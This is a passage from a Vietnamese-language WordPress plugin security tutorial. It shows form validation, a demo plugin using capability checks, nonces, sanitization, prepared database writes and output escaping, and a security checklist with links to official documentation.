    // === CUSTOM (tuy chinh) ===
    // Kiem tra password
    if ( ! empty( $data['password'] ) ) {
        if ( strlen( $data['password'] ) < 8 ) {
            $errors['password'] = 'Mat khau phai co it nhat 8 ky tu.';
        }
        if ( ! preg_match( '/[A-Z]/', $data['password'] ) ) {
            $errors['password'] = 'Mat khau phai co it nhat 1 chu hoa.';
        }
        if ( ! preg_match( '/[0-9]/', $data['password'] ) ) {
            $errors['password'] = 'Mat khau phai co it nhat 1 so.';
        }
    }

    return $errors;
}

// === SU DUNG ===
function process_form() {
    // 1. Sanitize
    $data = array(
        'name'    => sanitize_text_field( $_POST['name'] ?? '' ),
        'email'   => sanitize_email( $_POST['email'] ?? '' ),
        'phone'   => sanitize_text_field( $_POST['phone'] ?? '' ),
        'website' => esc_url_raw( $_POST['website'] ?? '' ),
        'age'     => absint( $_POST['age'] ?? 0 ),
        'status'  => sanitize_text_field( $_POST['status'] ?? 'pending' ),
    );

    // 2. Validate
    $errors = validate_contact_form( $data );

    if ( ! empty( $errors ) ) {
        // Co loi -> hien thi lai form voi thong bao loi
        foreach ( $errors as $field => $message ) {
            echo '<p class="error">' . esc_html( $message ) . '</p>';
        }
        return;
    }

    // 3. Luu vao database (voi prepare)
    global $wpdb;
    $wpdb->insert(
        $wpdb->prefix . 'contacts',
        $data,
        array( '%s', '%s', '%s', '%s', '%d', '%s' )
    );
}
```

---

## 11. Code vi du cho tung loai bao mat

### Plugin bao mat tong hop

```php
<?php
/**
 * Plugin Name:       Security Demo Plugin
 * Description:       Demo tat ca ky thuat bao mat trong WordPress plugin.
 * Version:           1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

class Security_Demo_Plugin {

    public function __construct() {
        add_action( 'admin_menu', array( $this, 'add_menu' ) );
        add_action( 'admin_init', array( $this, 'handle_form' ) );
        add_action( 'wp_ajax_sdp_ajax_action', array( $this, 'handle_ajax' ) );
        add_action( 'rest_api_init', array( $this, 'register_api' ) );
    }

    public function add_menu() {
        add_options_page(
            'Security Demo',
            'Security Demo',
            'manage_options',  // CAPABILITY CHECK #1: Chi admin thay menu
            'security-demo',
            array( $this, 'render_page' )
        );
    }

    /**
     * Xu ly form submit - BAO MAT TOAN DIEN
     */
    public function handle_form() {
        if ( ! isset( $_POST['sdp_submit'] ) ) {
            return;
        }

        // BAO MAT #1: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            wp_die( 'Khong co quyen.' );
        }

        // BAO MAT #2: Kiem tra CSRF (nonce)
        check_admin_referer( 'sdp_save_settings', 'sdp_nonce' );

        // BAO MAT #3: Sanitize tat ca input
        $data = array(
            'name'    => sanitize_text_field( $_POST['sdp_name'] ?? '' ),
            'email'   => sanitize_email( $_POST['sdp_email'] ?? '' ),
            'url'     => esc_url_raw( $_POST['sdp_url'] ?? '' ),
            'content' => wp_kses_post( $_POST['sdp_content'] ?? '' ),
            'number'  => absint( $_POST['sdp_number'] ?? 0 ),
            'status'  => sanitize_text_field( $_POST['sdp_status'] ?? '' ),
        );

        // BAO MAT #4: Validate
        $errors = array();
        if ( empty( $data['name'] ) ) {
            $errors[] = 'Ten la bat buoc.';
        }
        if ( ! is_email( $data['email'] ) ) {
            $errors[] = 'Email khong hop le.';
        }
        if ( ! in_array( $data['status'], array( 'active', 'inactive' ), true ) ) {
            $errors[] = 'Trang thai khong hop le.';
        }
        if ( $data['number'] < 1 || $data['number'] > 100 ) {
            $errors[] = 'So phai tu 1 den 100.';
        }

        if ( ! empty( $errors ) ) {
            set_transient( 'sdp_errors', $errors, 30 );
            set_transient( 'sdp_form_data', $data, 30 );
            return;
        }

        // BAO MAT #5: Luu voi prepared statement
        global $wpdb;
        $wpdb->insert(
            $wpdb->prefix . 'sdp_items',
            $data,
            array( '%s', '%s', '%s', '%s', '%d', '%s' )
        );

        set_transient( 'sdp_success', 'Da luu thanh cong!', 30 );
    }

    /**
     * AJAX handler - BAO MAT TOAN DIEN
     */
    public function handle_ajax() {
        // BAO MAT #1: Kiem tra CSRF
        check_ajax_referer( 'sdp_ajax_nonce', 'nonce' );

        // BAO MAT #2: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            wp_send_json_error( array( 'message' => 'Forbidden' ), 403 );
        }

        // BAO MAT #3: Sanitize
        $action = sanitize_text_field( $_POST['sub_action'] ?? '' );
        $id = absint( $_POST['item_id'] ?? 0 );

        // BAO MAT #4: Validate
        if ( empty( $action ) || $id < 1 ) {
            wp_send_json_error( array( 'message' => 'Thieu du lieu.' ) );
        }

        // BAO MAT #5: Whitelisting actions
        $allowed_actions = array( 'activate', 'deactivate', 'delete' );
        if ( ! in_array( $action, $allowed_actions, true ) ) {
            wp_send_json_error( array( 'message' => 'Action khong hop le.' ) );
        }

        // BAO MAT #6: Prepare statement
        global $wpdb;
        $table = $wpdb->prefix . 'sdp_items';

        switch ( $action ) {
            case 'delete':
                $wpdb->delete( $table, array( 'id' => $id ), array( '%d' ) );
                break;

            case 'activate':
            case 'deactivate':
                $wpdb->update(
                    $table,
                    array( 'status' => $action === 'activate' ? 'active' : 'inactive' ),
                    array( 'id' => $id ),
                    array( '%s' ),
                    array( '%d' )
                );
                break;
        }

        wp_send_json_success( array( 'message' => 'Thanh cong!' ) );
    }

    /**
     * REST API - BAO MAT TOAN DIEN
     */
    public function register_api() {
        register_rest_route( 'sdp/v1', '/items', array(
            'methods'  => 'POST',
            'callback' => array( $this, 'api_create_item' ),
            // BAO MAT #1: Permission callback
            'permission_callback' => function() {
                return current_user_can( 'manage_options' );
            },
            // BAO MAT #2: Validate va Sanitize trong args
            'args' => array(
                'name' => array(
                    'required'          => true,
                    'sanitize_callback' => 'sanitize_text_field',
                    'validate_callback' => function( $value ) {
                        return ! empty( $value ) && strlen( $value ) <= 200;
                    },
                ),
                'email' => array(
                    'required'          => true,
                    'sanitize_callback' => 'sanitize_email',
                    'validate_callback' => 'is_email',
                ),
            ),
        ));
    }

    public function api_create_item( \WP_REST_Request $request ) {
        // Data da duoc sanitize va validate boi args
        $name  = $request->get_param( 'name' );
        $email = $request->get_param( 'email' );

        // BAO MAT #3: Prepare statement khi luu
        global $wpdb;
        $wpdb->insert(
            $wpdb->prefix . 'sdp_items',
            array( 'name' => $name, 'email' => $email ),
            array( '%s', '%s' )
        );

        return new \WP_REST_Response( array(
            'id'   => $wpdb->insert_id,
            'name' => $name, // Da duoc sanitize
        ), 201 );
    }

    /**
     * Render trang - ESCAPE TAT CA OUTPUT
     */
    public function render_page() {
        // BAO MAT: Kiem tra quyen
        if ( ! current_user_can( 'manage_options' ) ) {
            return;
        }

        $errors = get_transient( 'sdp_errors' );
        $success = get_transient( 'sdp_success' );
        $form_data = get_transient( 'sdp_form_data' ) ?: array();
        delete_transient( 'sdp_errors' );
        delete_transient( 'sdp_success' );
        delete_transient( 'sdp_form_data' );
        ?>
        <div class="wrap">
            <h1><?php echo esc_html( get_admin_page_title() ); ?></h1>

            <?php if ( $success ) : ?>
                <!-- BAO MAT: Escape thong bao -->
                <div class="notice notice-success"><p><?php echo esc_html( $success ); ?></p></div>
            <?php endif; ?>

            <?php if ( $errors ) : ?>
                <div class="notice notice-error">
                    <?php foreach ( $errors as $error ) : ?>
                        <p><?php echo esc_html( $error ); ?></p>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <form method="post" action="">
                <!-- BAO MAT: Nonce field -->
                <?php wp_nonce_field( 'sdp_save_settings', 'sdp_nonce' ); ?>

                <table class="form-table">
                    <tr>
                        <th><label for="sdp_name">Ten</label></th>
                        <td>
                            <!-- BAO MAT: esc_attr cho value -->
                            <input type="text" name="sdp_name" id="sdp_name"
                                   value="<?php echo esc_attr( $form_data['name'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_email">Email</label></th>
                        <td>
                            <input type="email" name="sdp_email" id="sdp_email"
                                   value="<?php echo esc_attr( $form_data['email'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_url">Website</label></th>
                        <td>
                            <!-- BAO MAT: esc_attr (khong phai esc_url) cho value cua input -->
                            <input type="url" name="sdp_url" id="sdp_url"
                                   value="<?php echo esc_attr( $form_data['url'] ?? '' ); ?>"
                                   class="regular-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_number">So luong</label></th>
                        <td>
                            <input type="number" name="sdp_number" id="sdp_number"
                                   value="<?php echo esc_attr( $form_data['number'] ?? 10 ); ?>"
                                   min="1" max="100" class="small-text">
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_status">Trang thai</label></th>
                        <td>
                            <select name="sdp_status" id="sdp_status">
                                <option value="active" <?php selected( $form_data['status'] ?? '', 'active' ); ?>>Active</option>
                                <option value="inactive" <?php selected( $form_data['status'] ?? '', 'inactive' ); ?>>Inactive</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <th><label for="sdp_content">Noi dung</label></th>
                        <td>
                            <textarea name="sdp_content" id="sdp_content" rows="5" class="large-text"><?php
                                echo esc_textarea( $form_data['content'] ?? '' );
                            ?></textarea>
                        </td>
                    </tr>
                </table>

                <?php submit_button( 'Luu cai dat', 'primary', 'sdp_submit' ); ?>
            </form>
        </div>
        <?php
    }
}

new Security_Demo_Plugin();
```

---

## 12. Best Practices

### Checklist bao mat cho moi plugin

```
INPUT:
[ ] Sanitize TAT CA input tu $_GET, $_POST, $_REQUEST, $_FILES
[ ] Validate du lieu truoc khi xu ly
[ ] Dung wp_kses() hoac wp_kses_post() cho HTML input

OUTPUT:
[ ] esc_html() cho text content
[ ] esc_attr() cho HTML attributes
[ ] esc_url() cho URLs (href, src)
[ ] esc_textarea() cho textarea content
[ ] esc_js() cho inline JavaScript
[ ] wp_json_encode() cho JSON trong <script>

CSRF:
[ ] wp_nonce_field() trong moi form
[ ] check_admin_referer() khi xu ly form
[ ] check_ajax_referer() trong moi AJAX handler
[ ] wp_nonce_url() cho moi action link

QUYEN:
[ ] current_user_can() truoc moi hanh dong
[ ] permission_callback trong moi REST route
[ ] Dung capabilities phu hop (khong qua rong)

DATABASE:
[ ] $wpdb->prepare() cho MOI query co bien
[ ] $wpdb->insert/update/delete (tu escape)
[ ] Whitelist cho ORDER BY, ten cot
[ ] $wpdb->esc_like() cho LIKE queries

FILE:
[ ] Kiem tra MIME type thuc su (wp_check_filetype)
[ ] Gioi han kich thuoc file
[ ] Dung wp_handle_upload()
[ ] Lam sach ten file (sanitize_file_name)

KHAC:
[ ] if (!defined('ABSPATH')) exit; o dau moi file
[ ] Khong de loi PHP hien thi trong production
[ ] Khong luu mat khau dang plain text
[ ] Su dung HTTPS cho moi external request
[ ] Cap nhat plugin thuong xuyen
```

---

## Tham khao

- [WordPress Plugin Security](https://developer.wordpress.org/plugins/security/)
- [Data Validation](https://developer.wordpress.org/plugins/security/data-validation/)
- [Securing Input](https://developer.wordpress.org/plugins/security/securing-input/)
- [Securing Output](https://developer.wordpress.org/plugins/security/securing-output/)
- [Nonces](https://developer.wordpress.org/plugins/security/nonces/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
